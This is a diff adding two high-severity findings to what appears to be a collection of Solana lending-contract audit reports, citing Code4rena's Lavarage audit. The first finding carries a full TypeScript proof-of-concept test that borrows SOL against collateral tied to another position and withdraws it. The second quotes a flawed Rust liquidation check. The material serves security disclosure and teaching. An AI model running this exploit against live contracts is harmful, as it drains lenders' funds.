@@ -1146,3 +1146,429 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 10.[High] A borrower can borrow SOL without backing it by a collateral
+
+### collateral matches position
+
+- Summary: A borrower can exploit the system to borrow SOL without providing collateral. This occurs because the borrower can open two positions simultaneously and link collateral to only one position. The borrow function checks for the existence of collateral but does not verify if it matches the correct position.
+
+- Impact & Recommendation: On borrow validate that the TradingOpenAddCollateral has the relevant position account.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#h-02-a-borrower-can-borrow-sol-without-backing-it-by-a-collateral) & [Report](https://code4rena.com/reports/2024-04-lavarage)
+
+  <details><summary>POC</summary>
+
+  ```typescript
+  import * as anchor from "@coral-xyz/anchor";
+  import {
+    Keypair,
+    PublicKey,
+    Signer,
+    SystemProgram,
+    SYSVAR_CLOCK_PUBKEY,
+    SYSVAR_INSTRUCTIONS_PUBKEY,
+    Transaction,
+  } from "@solana/web3.js";
+  import { Lavarage } from "../target/types/lavarage";
+  import {
+    createMint,
+    createTransferCheckedInstruction,
+    getAccount,
+    getOrCreateAssociatedTokenAccount,
+    mintTo,
+    TOKEN_PROGRAM_ID,
+  } from "@solana/spl-token";
+  import { web3 } from "@coral-xyz/anchor";
+  export function getPDA(programId, seed) {
+    const seedsBuffer = Array.isArray(seed) ? seed : [seed];
+    return web3.PublicKey.findProgramAddressSync(seedsBuffer, programId)[0];
+  }
+  describe("lavarage", () => {
+    anchor.setProvider(anchor.AnchorProvider.env());
+    const program: anchor.Program<Lavarage> = anchor.workspace.Lavarage;
+    const nodeWallet = anchor.web3.Keypair.generate();
+    const anotherPerson = anchor.web3.Keypair.generate();
+    const seed = anchor.web3.Keypair.generate();
+    // TEST ONLY!!! DO NOT USE!!!
+    const oracleKeyPair = anchor.web3.Keypair.fromSecretKey(
+      Uint8Array.from([
+        70, 207, 196, 18, 254, 123, 0, 205, 199, 137, 184, 9, 156, 224, 62, 74,
+        209, 0, 80, 73, 146, 151, 175, 68, 182, 180, 53, 91, 214, 7, 167, 209,
+        140, 140, 158, 10, 59, 141, 76, 114, 109, 208, 44, 110, 77, 64, 149,
+        121, 7, 226, 125, 0, 105, 29, 76, 131, 99, 95, 123, 206, 81, 5, 198, 140,
+      ])
+    );
+    let tokenMint;
+    let userTokenAccount;
+    let tokenMint2;
+    let userTokenAccount2;
+    const provider = anchor.getProvider();
+    async function mintMockTokens(
+      people: Signer,
+      provider: anchor.Provider,
+      amount: number
+    ): Promise<any> {
+      const connection = provider.connection;
+      const signature = await connection.requestAirdrop(
+        people.publicKey,
+        2000000000
+      );
+      await connection.confirmTransaction(signature, "confirmed");
+      // Create a new mint
+      const mint = await createMint(
+        connection,
+        people,
+        people.publicKey,
+        null,
+        9 // Assuming a decimal place of 9
+      );
+      // Get or create an associated token account for the recipient
+      const recipientTokenAccount = await getOrCreateAssociatedTokenAccount(
+        connection,
+        people,
+        mint,
+        provider.publicKey
+      );
+      // Mint new tokens to the recipient's token account
+      await mintTo(
+        connection,
+        people,
+        mint,
+        recipientTokenAccount.address,
+        people,
+        amount
+      );
+      return {
+        mint,
+        recipientTokenAccount,
+      };
+    }
+    // Setup phase
+    it("Should mint new token!", async () => {
+      const { mint, recipientTokenAccount } = await mintMockTokens(
+        anotherPerson,
+        provider,
+        200000000000000000
+        // 200000000000,
+      );
+      tokenMint = mint;
+      userTokenAccount = recipientTokenAccount;
+    }, 20000);
+    it("Should create lpOperator node wallet", async () => {
+      await program.methods
+        .lpOperatorCreateNodeWallet()
+        .accounts({
+          nodeWallet: nodeWallet.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          operator: program.provider.publicKey,
+        })
+        .signers([nodeWallet])
+        .rpc();
+    });
+    it("Should create trading pool", async () => {
+      const tradingPool = getPDA(program.programId, [
+        Buffer.from("trading_pool"),
+        provider.publicKey.toBuffer(),
+        tokenMint.toBuffer(),
+      ]);
+      await program.methods
+        .lpOperatorCreateTradingPool(50)
+        .accounts({
+          nodeWallet: nodeWallet.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          operator: program.provider.publicKey,
+          tradingPool,
+          mint: tokenMint,
+        })
+        .rpc();
+    });
+
+    it("Should fund node wallet", async () => {
+      await program.methods
+        .lpOperatorFundNodeWallet(new anchor.BN(500000000000))
+        .accounts({
+          nodeWallet: nodeWallet.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          funder: program.provider.publicKey,
+        })
+        .rpc();
+    });
+    it("Should set maxBorrow", async () => {
+      const tradingPool = getPDA(program.programId, [
+        Buffer.from("trading_pool"),
+        provider.publicKey.toBuffer(),
+        tokenMint.toBuffer(),
+      ]);
+      // X lamports per 1 Token
+      await program.methods
+        .lpOperatorUpdateMaxBorrow(new anchor.BN(50))
+        .accountsStrict({
+          tradingPool,
+          nodeWallet: nodeWallet.publicKey,
+          operator: provider.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+        })
+        .rpc();
+    });
+    // repay
+    it("Hacker can extract SOL and Collaterl", async () => {
+      //
+      const seed = Keypair.generate();
+      const seed2 = Keypair.generate();
+      const tradingPool = getPDA(program.programId, [
+        Buffer.from("trading_pool"),
+        provider.publicKey.toBuffer(),
+        tokenMint.toBuffer(),
+      ]);
+      // create ATA for position account
+      const positionAccount = getPDA(program.programId, [
+        Buffer.from("position"),
+        provider.publicKey?.toBuffer(),
+        tradingPool.toBuffer(),
+        // unique identifier for the position
+        seed.publicKey.toBuffer(),
+      ]);
+      const positionATA = await getOrCreateAssociatedTokenAccount(
+        provider.connection,
+        anotherPerson,
+        tokenMint,
+        positionAccount,
+        true
+      );
+      // create ATA for position account 2
+      const positionAccount2 = getPDA(program.programId, [
+        Buffer.from("position"),
+        provider.publicKey?.toBuffer(),
+        tradingPool.toBuffer(),
+        // unique identifier for the position
+        seed2.publicKey.toBuffer(),
+      ]);
+      const positionATA2 = await getOrCreateAssociatedTokenAccount(
+        provider.connection,
+        anotherPerson,
+        tokenMint,
+        positionAccount2,
+        true
+      );
+      // actual borrow
+      const borrowIx = await program.methods
+        .tradingOpenBorrow(new anchor.BN(10), new anchor.BN(5))
+        .accountsStrict({
+          positionAccount,
+          trader: provider.publicKey,
+          tradingPool,
+          nodeWallet: nodeWallet.publicKey,
+          randomAccountAsId: seed.publicKey,
+          // frontend fee receiver. could be any address. opening fee 0.5%
+          feeReceipient: anotherPerson.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
+          instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
+        })
+        .instruction();
+      const transferIx = createTransferCheckedInstruction(
+        userTokenAccount.address,
+        tokenMint,
+        positionATA.address,
+        provider.publicKey,
+        100000000000000000,
+        9
+      );
+      const transferIx2 = createTransferCheckedInstruction(
+        userTokenAccount.address,
+        tokenMint,
+        positionATA.address, // transfer to the other account (1st pos)
+        provider.publicKey,
+        100000000000000000,
+        9
+      );
+      // the param in this method is deprecated. should be removed.
+      const addCollateralIx = await program.methods
+        .tradingOpenAddCollateral()
+        .accountsStrict({
+          positionAccount,
+          tradingPool,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          trader: provider.publicKey,
+          randomAccountAsId: seed.publicKey,
+          mint: tokenMint,
+          toTokenAccount: positionATA.address, // I need to create this account
+        })
+        .instruction();
+      // actual borrow 2
+      const borrowIx2 = await program.methods
+        .tradingOpenBorrow(
+          new anchor.BN(10000000000),
+          new anchor.BN(5000000000)
+        )
+        .accountsStrict({
+          positionAccount: positionAccount2,
+          trader: provider.publicKey,
+          tradingPool,
+          nodeWallet: nodeWallet.publicKey,
+          randomAccountAsId: seed2.publicKey,
+          // frontend fee receiver. could be any address. opening fee 0.5%
+          feeReceipient: anotherPerson.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
+          instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
+        })
+        .instruction();
+      // the param in this method is deprecated. should be removed.
+      const addCollateralIx2 = await program.methods
+        .tradingOpenAddCollateral()
+        .accountsStrict({
+          positionAccount: positionAccount,
+          tradingPool,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          trader: provider.publicKey,
+          randomAccountAsId: seed.publicKey,
+          mint: tokenMint,
+          toTokenAccount: positionATA.address,
+        })
+        .instruction();
+      let tokenAccount = await getAccount(
+        provider.connection,
+        positionATA.address
+      );
+      let tokenAccount2 = await getAccount(
+        provider.connection,
+        positionATA2.address
+      );
+      let userTokenAcc = await getAccount(
+        provider.connection,
+        userTokenAccount.address
+      );
+      console.log("===== Initial Amounts======");
+      console.log("Pos#1.collateral    : ", tokenAccount.amount);
+      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
+      console.log("Borrower Collateral : ", userTokenAcc.amount);
+      console.log(
+        "Node Sol            : ",
+        await provider.connection.getBalance(nodeWallet.publicKey)
+      );
+      console.log(
+        "Borrower Sol        : ",
+        await provider.connection.getBalance(provider.publicKey)
+      );
+
+      const tx_borrow = new Transaction()
+        .add(borrowIx)
+        .add(transferIx)
+        .add(addCollateralIx)
+        .add(borrowIx2)
+        .add(transferIx2)
+        .add(addCollateralIx2); // add collateral but link it to first Pos
+      await provider.sendAll([{ tx: tx_borrow }]);
+      console.log("===== After Borrow #1 and #2======");
+
+      tokenAccount = await getAccount(provider.connection, positionATA.address);
+
+      tokenAccount2 = await getAccount(
+        provider.connection,
+        positionATA2.address
+      );
+      userTokenAcc = await getAccount(
+        provider.connection,
+        userTokenAccount.address
+      );
+      const tokenAccount_amount = tokenAccount.amount;
+      const userTokenAcc_amount = userTokenAcc.amount;
+      console.log("Pos#1.collateral    : ", tokenAccount_amount);
+      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
+      console.log("Borrower Collateral : ", userTokenAcc_amount);
+      const node_balance = await provider.connection.getBalance(
+        nodeWallet.publicKey
+      );
+      const user_balance = await provider.connection.getBalance(
+        provider.publicKey
+      );
+      console.log("Node Sol            : ", node_balance);
+      console.log("Borrower Sol        : ", user_balance);
+      const receiveCollateralIx = await program.methods
+        .tradingCloseBorrowCollateral()
+        .accountsStrict({
+          positionAccount: positionAccount,
+          trader: provider.publicKey,
+          tradingPool,
+          instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          clock: SYSVAR_CLOCK_PUBKEY,
+          randomAccountAsId: seed.publicKey,
+          mint: tokenMint,
+          toTokenAccount: userTokenAccount.address,
+          fromTokenAccount: positionATA.address,
+          tokenProgram: TOKEN_PROGRAM_ID,
+        })
+        .instruction();
+      const repaySOLIx = await program.methods
+        // .tradingCloseRepaySol(new anchor.BN(20000), new anchor.BN(9998))
+        .tradingCloseRepaySol(new anchor.BN(0), new anchor.BN(9998))
+        .accountsStrict({
+          positionAccount: positionAccount,
+          trader: provider.publicKey,
+          tradingPool,
+          nodeWallet: nodeWallet.publicKey,
+          systemProgram: anchor.web3.SystemProgram.programId,
+          clock: SYSVAR_CLOCK_PUBKEY,
+          randomAccountAsId: seed.publicKey,
+          feeReceipient: anotherPerson.publicKey,
+        })
+        .instruction();
+
+      const tx_repay = new Transaction()
+        .add(receiveCollateralIx)
+        .add(repaySOLIx);
+      console.log(
+        ">>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>"
+      );
+      await provider.sendAll([{ tx: tx_repay }]);
+      console.log("===== After Successful Repay ======");
+      tokenAccount = await getAccount(provider.connection, positionATA.address);
+      tokenAccount2 = await getAccount(
+        provider.connection,
+        positionATA2.address
+      );
+      userTokenAcc = await getAccount(
+        provider.connection,
+        userTokenAccount.address
+      );
+      const tokenAccount_amount2 = tokenAccount.amount;
+      const userTokenAcc_amount2 = userTokenAcc.amount;
+      console.log("Pos#1.collateral    : ", tokenAccount_amount2);
+      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
+      console.log("Borrower Collateral : ", userTokenAcc_amount2);
+      const node_balance2 = await provider.connection.getBalance(
+        nodeWallet.publicKey
+      );
+      const user_balance2 = await provider.connection.getBalance(
+        provider.publicKey
+      );
+      console.log("Node Sol            : ", node_balance2);
+      console.log("Borrower Sol        : ", user_balance2);
+    });
+  });
+  ```
+
+  </details>
+
+## 11.[High] Malicious borrowers will never repay loans with high interest
+
+### calculate loan without interest
+
+- Summary: The liquidation check does not consider accrued interest when calculating the Loan-to-Value (LTV) ratio. This allows borrowers to avoid repayment if the interest grows too much and the original borrowed amount’s LTV (without accrued interest) stays under 90%, leading to bad debt for lenders.
+
+- Impact & Recommendation: Consider adding the owed interest to the total amount when performing the liquidation check.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#h-03-malicious-borrowers-will-never-repay-loans-with-high-interest) & [Report](https://code4rena.com/reports/2024-04-lavarage)
+
+  <details><summary>POC</summary>
+
+  ```rust
+
+  require!(ctx.accounts.position_account.amount * 1000 / position_size  > 900, FlashFillError::ExpectedCollateralNotEnough );
+
+  ctx.accounts.position_account.amount = position_size - user_pays;
+
+  ```
+
+  </details>
